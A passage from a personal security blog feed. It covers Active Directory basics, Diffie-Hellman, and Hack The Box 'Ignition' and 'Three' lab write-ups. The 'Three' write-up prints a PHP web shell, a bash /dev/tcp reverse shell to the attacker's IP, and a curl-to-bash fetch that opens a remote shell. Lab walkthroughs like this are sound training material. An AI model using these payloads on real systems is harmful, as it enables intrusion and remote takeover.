<p>To deploy different policies for each OU individually Windows use <strong><em>Group Policy Objects (GPO)</em></strong>. GPOs are simply a collection of settings that can be applied to OUs. GPOs can contain policies aimed at either users or computers, allowing you to set a baseline on specific machines and identities.</p>
<br>
<h4 id="what-is-the-name-of-the-network-share-used-to-distribute-gpos-to-domain-machines">What is the name of the network share used to distribute GPOs to domain machines?</h4>






<pre tabindex="0"><code>SYSVOL</code></pre>
<p>GPOs are distributed to the network via a network share called <code>SYSVOL</code>, which is stored in the DC. All users in a domain should typically have access to this share over the network to sync their GPOs periodically.</p>
<br>
<h4 id="can-a-gpo-be-used-to-apply-settings-to-users-and-computers-yaynay">Can a GPO be used to apply settings to users and computers? (yay/nay)</h4>






<pre tabindex="0"><code>yay</code></pre>
<br>
<p>When using Windows domains, all credentials are stored in the <code>Domain Controllers</code>. Whenever a user tries to authenticate to a service using domain credentials, the service will need to ask the Domain Controller to verify if they are correct. Two protocols can be used for network authentication in windows domains:</p>
<ul>
<li><strong><em>Kerberos</em></strong>: used by any recent version of Windows. This is the default protocol in any recent domain.</li>
<li><strong><em>NetNTLM</em></strong>: Legacy authentication protocol kept for compatibility purposes.</li>
</ul>
<h4 id="kerberos-authentication">Kerberos Authentication</h4>
<p>Kerberos authentication is the default authentication protocol for any recent version of Windows. users who log into a service using Kerberos will be assigned tickets. Think of tickets as proof of a previous authentication. users with tickets can present them to a service to demonstrate they have already authenticated into the network before and are therefore enabled to use it.</p>
<p>When <code>Kerberos</code> is used for authentication, the following process happens:</p>
<ol>
<li>The user sends their encrypted credentials to the <code>Key Distribution Center (KDC)</code> in charge of creating Kerberos tickets on the network. The KDC will create and send back a <code>Ticket Granting Ticket</code>, which will allow the user to request additional tickets to access specific services. <code>TGT</code> is encrypted using the <code>krbgt</code> account&rsquo;s password hash and therefore the user can&rsquo;t access its contents.</li>
</ol>
<p><img src="image-6.png#center" alt="alt text"></p>
<ol start="2">
<li>
<p>When a user wants to connect to a service on the network, they will use their TGT to ask the KDC for a <code>Ticket Granting Service (TGS)</code>.
TGS are tickets that allow connection only to the specific service they were created for. To request a TGS, the user will send their credentials encrypted using the Session Key, along with the TGT and a <code>Service Principal Name (SPN)</code>, which indicates the service and server name we intend to access.</p>
<p>As a result, the KDC will send us a TGS along with a <code>Service Session Key</code>, which we will need to authenticate to the service we want to access. The TGS is encrypted using a key derived from the <code>Service Owner Hash</code>.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
</li>
<li>
<p>The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account&rsquo;s password hash to decrypt the TGS and validate the Service Session Key.
<img src="image-8.png#center" alt="alt text"></p>
</li>
</ol>
<br>
<h4 id="netntlm-authentication">NetNTLM Authentication</h4>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<h4 id="will-a-current-version-of-windows-use-netntlm-as-the-preferred-authentication-protocol-by-default-yaynay">Will a current version of Windows use NetNTLM as the preferred authentication protocol by default? (yay/nay)</h4>






<pre tabindex="0"><code>nay</code></pre>
<br>
<h4 id="when-referring-to-kerberos-what-type-of-ticket-allows-us-to-request-further-tickets-known-as-tgs">When referring to Kerberos, what type of ticket allows us to request further tickets known as TGS?</h4>






<pre tabindex="0"><code>Ticket Granting Ticket</code></pre>
<br>
<h4 id="when-using-netntlm-is-a-users-password-transmitted-over-the-network-at-any-point-yaynay">When using NetNTLM, is a user&rsquo;s password transmitted over the network at any point? (yay/nay)</h4>






<pre tabindex="0"><code>nay</code></pre>
<br>
<h4 id="what-is-a-group-of-windows-domains-that-share-the-same-namespace-called">What is a group of Windows domains that share the same namespace called?</h4>






<pre tabindex="0"><code>Tree</code></pre>
<br>
<h4 id="what-should-be-configured-between-two-domains-for-a-user-in-domain-a-to-access-a-resource-in-domain-b">What should be configured between two domains for a user in Domain A to access a resource in Domain B?</h4>






<pre tabindex="0"><code>A Trust Relationship</code></pre>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Ignition</title>
      <link>http://localhost:1313/htb-ignition/</link>
      <pubDate>Mon, 15 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-ignition/</guid>
      <description>Which service version is found to be running on port 80? nginx 1.14.2 What is the 3-digit HTTP status code returned when you visit http://{machine IP}/? 302 curl -v http://10.129.98.187
What is the virtual host name the webpage expects to be accessed by? ignition.htb What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs? /etc/hosts the ignition.</description>
      <content:encoded><![CDATA[<h4 id="which-service-version-is-found-to-be-running-on-port-80">Which service version is found to be running on port 80?</h4>






<pre tabindex="0"><code>nginx 1.14.2</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-3-digit-http-status-code-returned-when-you-visit-httpmachine-ip">What is the 3-digit HTTP status code returned when you visit http://{machine IP}/?</h4>






<pre tabindex="0"><code>302</code></pre>
<p><code>curl -v http://10.129.98.187</code></p>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-virtual-host-name-the-webpage-expects-to-be-accessed-by">What is the virtual host name the webpage expects to be accessed by?</h4>






<pre tabindex="0"><code>ignition.htb</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-full-path-to-the-file-on-a-linux-computer-that-holds-a-local-list-of-domain-name-to-ip-address-pairs">What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs?</h4>






<pre tabindex="0"><code>/etc/hosts</code></pre>
<p>the <code>ignition.htb</code> address and its corresponding IP address is added to the file as an entry</p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<h4 id="use-a-tool-to-brute-force-directories-on-the-webserver-what-is-the-full-url-to-the-magento-login-page">Use a tool to brute force directories on the webserver. What is the full URL to the Magento login page?</h4>






<pre tabindex="0"><code>http://ignition.htb/admin</code></pre>
<p>I ran a gobuster to brute force directories on the web server and found that <code>/admin</code> url navigates us to the Magento login page.</p>
<p><code>gobuster dir -u http://ignition.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>
<p><img src="image-4.png#center" alt="alt text"></p>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="look-up-the-password-requirements-for-magento-and-also-try-searching-for-the-most-common-passwords-of-2023-which-password-provides-access-to-the-admin-account">Look up the password requirements for Magento and also try searching for the most common passwords of 2023. Which password provides access to the admin account?</h4>






<pre tabindex="0"><code>qwerty123</code></pre>
<p>As you can see from the search result, Magento requires a minimum of seven chracters (both letters and numbers). From the list of most common passwords of 2023, only passwords that contain both letters and numbers are: <code>qwerty123</code> and <code>1q2w3e</code>. However, the latter has only 6 characters.</p>
<p><code>username: admin, password: qwerty123</code>. The pair worked!</p>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>797d6c988d9dc5865e010b9410f247e0</code></pre>
<p>I&rsquo;ve tried looking everywhere on the web page. It turned out the flag was on the main dashboard page. haha</p>
<p><img src="image-10.png#center" alt="alt text"></p>
<br>
<p><img src="image-9.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] Key Exchange</title>
      <link>http://localhost:1313/til-key-exchange/</link>
      <pubDate>Mon, 15 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-key-exchange/</guid>
      <description>What is a Key Exchange? A key exchange is a method used in cryptography to securely exchange cryptographic keys between two parties. These keys are then used to encrypt and decrypt messages, ensuring that the communication remains private and secure. The primary challenge in key exchange is to do this securely over an insecure communication channel, such as the internet.
What is Diffie-Hellman Key Exchange? The Diffie-Hellman key exchange is one of the earliest and most widely used methods for securely exchanging cryptographic keys.</description>
      <content:encoded><![CDATA[<h4 id="what-is-a-key-exchange">What is a Key Exchange?</h4>
<p>A key exchange is a method used in cryptography to securely exchange cryptographic keys between two parties. These keys are then used to encrypt and decrypt messages, ensuring that the communication remains private and secure. The primary challenge in key exchange is to do this securely over an insecure communication channel, such as the internet.</p>
<h4 id="what-is-diffie-hellman-key-exchange">What is Diffie-Hellman Key Exchange?</h4>
<p>The Diffie-Hellman key exchange is one of the earliest and most widely used methods for securely exchanging cryptographic keys. It allows two parties to generate a shared secret over an insecure channel without having to transmit the secret itself.</p>
<p><strong><em>Simplified example</em></strong>: Alice and Bob want to talk securely. They want to establish a common key, so they can use symmetric cryptography, but they don&rsquo;t want to use key exchange with asymmetric cryptography. This is where Diffie Hellman Key Exchange comes in.</p>
<p>Alice and Bob both have secrets that they generate, let&rsquo;s call these <code>A</code> and <code>B</code>. They also have some common material that&rsquo;s public, let&rsquo;s call this <code>C</code>.</p>
<p>Alice and Bob will combine their secrets with the common material and form <code>AC</code> and <code>BC</code>. They will then send these to each other, and combine that with their secrets to form two identical keys, both <code>ABC</code>. Now they can use this key to communicate.</p>
<hr>
<p>The <strong><em>Diffie-Hellman key exchange</em></strong> was explained in detail by the famous YouTube channel, <code>Computerphile</code>, in the following video:</p>


    
    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/NmM9HA2MQGI?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
      ></iframe>
    </div>

]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Three</title>
      <link>http://localhost:1313/htb-three/</link>
      <pubDate>Sun, 14 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-three/</guid>
      <description>As I have mentioned earlier from the previous posting, I&amp;rsquo;ve finished all the boxes in Hack The Box Starting Point Tier 0 and have moved on to Tier 1 boxes. However, I feel a bit overwhelmed because the difficulty has suddenly increased a lot. To be clear, I want to mention that I will likely rely somewhat on the official write-ups provided by Hack The Box, including for this write-up and for future boxes.</description>
      <content:encoded><![CDATA[<div style="text-align:center;"><img src="./sohard.gif"></div>
<p>As I have mentioned earlier from the previous posting, I&rsquo;ve finished all the boxes in Hack The Box Starting Point Tier 0 and have moved on to Tier 1 boxes. However, I feel a bit overwhelmed because the difficulty has suddenly increased a lot. To be clear, I want to mention that I will likely rely somewhat on the official write-ups provided by Hack The Box, including for this write-up and for future boxes. As a beginner, it&rsquo;s quite challenging and time-consuming to complete boxes of this level without any assistance, so I&rsquo;ve concluded that it&rsquo;s better to get some help now and try to solve them on my own again later.</p>
<hr>
<h4 id="how-many-tcp-ports-are-open">How many TCP ports are open?</h4>






<pre tabindex="0"><code>2</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>/etc<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nmap -sC -sV --min-rate <span style="color:#fab387">3000</span> 10.129.92.176 -p-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-14 23:11 EDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.92.176
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.033s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65533</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|   <span style="color:#fab387">2048</span> 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>|   <span style="color:#fab387">256</span> e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>|_  <span style="color:#fab387">256</span> 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 <span style="color:#89dceb;font-weight:bold">(</span>ED25519<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#89dceb;font-weight:bold">((</span>Ubuntu<span style="color:#89dceb;font-weight:bold">))</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>|_http-title: The Toppers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>|_http-server-header: Apache/2.4.29 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 33.21 seconds</span></span></code></pre></div>
<br>
<h4 id="what-is-the-domain-of-the-email-address-provided-in-the-contact-section-of-the-website">What is the domain of the email address provided in the &ldquo;Contact&rdquo; section of the website?</h4>






<pre tabindex="0"><code>thetoppers.htb</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="in-the-absence-of-a-dns-server-which-linux-file-can-we-use-to-resolve-hostname-to-ip-addresses-in-order-to-be-able-to-access-the-websites-that-point-to-those-hostnames">In the absence of a DNS server, which Linux file can we use to resolve hostname to IP addresses in order to be able to access the websites that point to those hostnames?</h4>






<pre tabindex="0"><code>/etc/hosts</code></pre>
<p>I added an entry for the <code>thetoppers.htb</code> in the <code>/etc/hosts</code> file with the corresponding IP address to be able to access this domain in the browser.
<img src="image-1.png#center" alt="alt text"></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ <span style="color:#89dceb">echo</span> <span style="color:#a6e3a1">&#34;10.129.227.248 thetoppers.htb&#34;</span> | sudo tee -a /etc/hosts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>10.129.227.248 thetoppers.htb</span></span></code></pre></div>
<br>
<h4 id="which-sub-domain-is-discovered-during-further-enumeration">Which sub-domain is discovered during further enumeration?</h4>






<pre tabindex="0"><code>s3.thetoppers.htb</code></pre>
<p><strong><em>A subdomain</em></strong> name is a piece of additional information added to the beginning of a website&rsquo;s domain name. It allows websites to separate and organize content for a specific function. i.e. <code>ctf.hackthebox.com</code>. In this case, <code>ctf</code> is the subdomain, <code>hackthebox</code> is the primary domain and <code>com</code> is the top-level domain (TLD).</p>
<p>Often, different subdomains will have different IP addresses. It is also possible to have one server handle multiple subdomains. This is accomplished via <code>host-based routing</code> or <code>virtual host routing</code>, where the server uses the Host header in the HTTP request to determine which application is meant to handle the request.</p>
<p>Let&rsquo;s enumerate for any other sub-domains that may be present on the same server. Tools like <code>gobuster</code>, <code>wfuzz</code>, <code>feroxbuster</code>, and etc. are avilable for this purpose.</p>
<p>I used the <code>gobuster</code> to enumerate for sub-domains by running the following command:</p>
<p><code>gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb</code></p>
<p>The output:</p>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>Let&rsquo;s also add the <code>s3.thetoppers.htb</code> entry in the <code>/etc/hosts</code> file.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ <span style="color:#89dceb">echo</span> <span style="color:#a6e3a1">&#34;10.129.92.176 s3.thetoppers.htb&#34;</span> | sudo tee -a /etc/hosts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>sudo<span style="color:#89dceb;font-weight:bold">]</span> password <span style="color:#cba6f7">for</span> kali:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>10.129.92.176 s3.thetoppers.htb</span></span></code></pre></div>
<br>
<h4 id="which-service-is-running-on-the-discovered-sub-domain">Which service is running on the discovered sub-domain?</h4>






<pre tabindex="0"><code>Amazon S3</code></pre>
<p>I navigated to the newly found subdomain url and the only thing it shows is one JSON: <code>{&quot;status&quot;: &quot;running}</code>
<img src="image-3.png#center" alt="alt text"></p>
<p>Having researched about <code>s3 subdomain status running</code>, I found that <code>s3</code> is a cloud-based object storage service hosted by Amazon Web Services. It allows us to store things in containers called buckets. We can interact with the S3 bucket with the aid of the <code>awscli</code> utility.</p>
<br>
<h4 id="which-command-line-utility-can-be-used-to-interact-with-the-service-running-on-the-discovered-sub-domain">Which command line utility can be used to interact with the service running on the discovered sub-domain?</h4>






<pre tabindex="0"><code>awscli</code></pre>
<p>First we need to configure it using the command, <code>aws configure</code> and then I used an arbitrary value, temp, for all the fields.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ aws configure
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>AWS Access Key ID <span style="color:#89dceb;font-weight:bold">[</span>None<span style="color:#89dceb;font-weight:bold">]</span>: temp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>AWS Secret Access Key <span style="color:#89dceb;font-weight:bold">[</span>None<span style="color:#89dceb;font-weight:bold">]</span>: temp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>Default region name <span style="color:#89dceb;font-weight:bold">[</span>None<span style="color:#89dceb;font-weight:bold">]</span>: temp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>Default output format <span style="color:#89dceb;font-weight:bold">[</span>None<span style="color:#89dceb;font-weight:bold">]</span>: temp</span></span></code></pre></div>
<p>We can list all of the S3 buckets hosted by the server by using the <code>ls</code> command.</p>
<p><code>aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</code></p>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="which-command-is-used-to-set-up-the-aws-cli-installation">Which command is used to set up the AWS CLI installation?</h4>






<pre tabindex="0"><code>aws configure</code></pre>
<br>
<h4 id="what-is-the-command-used-by-the-above-utility-to-list-all-of-the-s3-buckets">What is the command used by the above utility to list all of the S3 buckets?</h4>






<pre tabindex="0"><code>aws s3 ls</code></pre>
<br>
<h4 id="this-server-is-configured-to-run-files-written-in-what-web-scripting-language">This server is configured to run files written in what web scripting language?</h4>






<pre tabindex="0"><code>PHP</code></pre>
<p>As we can see from the <code>ls</code> command output, we see the files <code>index.php</code>, <code>.htaccess</code>, and a directory called <code>images</code> in the specified bucket. Therefore, we know the website server is using PHP.</p>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>a980d99281a28d638ac68b9bf9453c2b</code></pre>
<p><code>awscli</code> has another feature that allows us to copy files to a remote bucket. We can try uploading a PHP shell file to the s3 bucket and since it&rsquo;s uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we will achieve remote code execution.</p>
<p>We can use the following PHP one-liner which takes the URL parameter <code>cmd</code> as an input and executes it as a system command.</p>
<p><code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code></p>
<p>Let&rsquo;s create a PHP file to upload</p>
<p><code>echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php</code></p>
<p>Then, we can upload this PHP shell to the <code>thetoppers.htb</code> S3 bucket using the following command:</p>
<p><code>aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</code></p>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<p>We can confirm that our shell is uploaded by navigating to <code>http://thetoppers.htb/shell.php</code>.</p>
<p>I tried executing the OS command <code>id</code> using the URL parameter cmd.
The response from the server contains the output of the OS command, id, which verified that we have code execution on the box.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<p>Now let&rsquo;s get a reverse shell creating a new file <code>shell.sh</code> containing the following bash reverse shell payload which will connect back to our local machine on port <code>1337</code>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#6c7086;font-style:italic">#!/bin/bash
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#6c7086;font-style:italic"></span>bash -i &gt;&amp; /dev/tcp/10.10.14.28/1337 0&gt;&amp;<span style="color:#fab387">1</span></span></span></code></pre></div>
<p>And also start a <code>netcat</code> listener on our local port 1337 using the following command:</p>
<p><code>nc lvnp 1337</code></p>
<p>Let&rsquo;s also start a web server on our local machine on <code>port 8000</code> and host this bash file. It is crucial to note here that this command for hosting the web server <strong><em>must be run from the directory which contains the reverse shell file</em></strong>. So we must first traverse to the appropriate directory and then run the followign command:</p>
<p><code>python3 -m http.server 8000</code></p>
<br>
<p>We can use the <code>curl</code> utility to fetch the bash reverse shell file from our local host and then pipe it to <code>bash</code> in order to execute it.
Let&rsquo;s visit the following URL containing the payload in the browser.</p>
<p><code>http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.28:8000/shell.sh|bash</code></p>
<br>
<p>After we had run the payload, we were able to receive a reverse shell on the netcat terminal window.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nc -nvlp <span style="color:#fab387">1337</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1337</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.129.92.176<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">41006</span>
